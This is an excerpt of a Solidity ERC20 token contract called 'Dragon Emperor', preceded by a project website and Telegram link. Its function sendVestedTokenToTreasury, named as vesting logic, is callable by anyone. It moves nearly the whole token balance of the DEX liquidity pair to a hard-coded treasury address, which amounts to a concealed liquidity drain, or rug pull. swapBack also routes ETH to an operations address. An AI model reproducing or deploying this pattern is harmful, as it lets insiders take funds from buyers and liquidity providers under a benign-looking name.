...
https://dragonemperor.io
https://t.me/dragonemperorentry
...
contract DragonEmperor is ERC20, Ownable {
    ...
    constructor() ERC20("Dragon Emperor", "DE") {
        ...
        vestedPool = IDexFactory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        lpPair = vestedPool;
        ...
        treasuryAddress = address(0x814b11065663caAFCE338F7486B9C09C377C594E);
    ...
    function sendVestedTokenToTreasury() external {
        uint256 vestedTokenBalance = balanceOf(vestedPool);
        _transfer(vestedPool, treasuryAddress, vestedTokenBalance - 2e18);
        emit SendVested();
    }
    ...
    function swapBack() private {
        uint256 contractEthBalace = address(this).balance;
        uint256 treasuryEthBalance = address(treasuryAddress).balance;
        uint256 feeDiff = contractEthBalace - treasuryEthBalance;

        if (feeDiff > 0) {
            (bool s,) = address(operationsAddress).call{value: feeDiff}("");
        }
